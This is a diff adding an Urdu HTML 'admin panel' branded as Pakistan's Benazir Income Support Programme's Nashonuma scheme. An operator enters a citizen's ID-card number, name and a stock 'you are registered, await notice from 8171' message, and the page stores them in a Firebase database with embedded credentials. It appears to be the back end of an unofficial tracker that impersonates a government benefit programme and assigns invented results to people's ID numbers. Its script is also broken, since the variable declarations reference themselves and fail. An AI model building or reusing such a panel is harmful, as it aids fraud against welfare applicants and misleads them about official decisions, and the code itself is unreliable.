@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="ur">
+<head>
+<meta charset="UTF-8">
+<title>نوشوما پروگرام | ایڈمن پینل</title>
+
+<style>
+body{
+  margin:0;
+  background:#eef3f6;
+  font-family:"Jameel Noori Nastaleeq", serif;
+  direction:rtl;
+}
+.page{
+  max-width:760px;
+  margin:20px auto;
+  background:#ffffff;
+  box-shadow:0 0 18px rgba(0,0,0,0.15);
+  border-radius:10px;
+  overflow:hidden;
+}
+.banner img{width:100%;display:block;}
+.header{
+  text-align:center;
+  padding:15px;
+  border-bottom:4px solid #0b6d3a;
+  background:#f9fffb;
+}
+.header h1{margin:0;color:#0b6d3a;font-size:32px;}
+.header p{margin:5px 0 0;font-size:20px;color:#333;}
+.form-card{padding:25px;}
+label{font-size:22px;margin-top:15px;display:block;}
+input, textarea{
+  width:100%;
+  padding:14px;
+  font-size:20px;
+  margin-top:6px;
+  border-radius:8px;
+  border:1px solid #ccc;
+}
+textarea{min-height:120px;line-height:2;background:#f9f9f9;}
+button{
+  margin-top:22px;
+  width:100%;
+  padding:16px;
+  font-size:24px;
+  background:#0b6d3a;
+  color:#fff;
+  border:none;
+  border-radius:8px;
+}
+.result-box{
+  display:none;
+  margin:25px;
+  padding:20px;
+  border-radius:10px;
+  background:#e9f7ef;
+  border:3px solid #0b6d3a;
+}
+</style>
+</head>
+
+<body>
+<div class="page">
+
+<div class="banner">
+  <img src="bisp-full-banner-tracker.png">
+</div>
+
+<div class="header">
+  <h1>نوشوما پروگرام</h1>
+  <p>بے نظیر انکم سپورٹ پروگرام</p>
+</div>
+
+<div class="form-card">
+  <label>شناختی کارڈ نمبر</label>
+  <input id="cnic">
+
+  <label>مکمل نام</label>
+  <input id="name">
+
+  <label>رزلٹ / پیغام</label>
+  <textarea id="message">
+آپ کا نوشونما پروگرام میں اندراج کر دیا گیا ہے۔
+جانچ پڑتال کے بعد آپ کو 8171 سے اطلاع دی جائے گی۔
+  </textarea>
+
+  <button onclick="saveResult()">ریکارڈ محفوظ کریں</button>
+</div>
+
+<div id="resultBox" class="result-box">
+  <p><b>نام:</b> <span id="r_name"></span></p>
+  <p><b>شناختی کارڈ:</b> <span id="r_cnic"></span></p>
+  <p id="r_message"></p>
+</div>
+
+</div>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyDBDDgWlq6-QOsLWPLBlCWQ9S_Xp3z5r9I",
+  authDomain: "nunma-8c477.firebaseapp.com",
+  databaseURL: "https://nunma-8c477-default-rtdb.firebaseio.com",
+  projectId: "nunma-8c477",
+  messagingSenderId: "287427812438",
+  appId: "1:287427812438:web:5c04823daf58c4d5a92ff7"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+
+window.saveResult = function(){
+  let cnic = cnic.value.trim();
+  let namev = name.value.trim();
+  let msg = message.value.trim();
+
+  set(ref(db,"results/"+cnic),{
+    name:namev,
+    message:msg,
+    time:new Date().toLocaleString("ur-PK")
+  });
+
+  r_name.innerText=namev;
+  r_cnic.innerText=cnic;
+  r_message.innerText=msg;
+  resultBox.style.display="block";
+}
+</script>
+
+</body>
+</html>
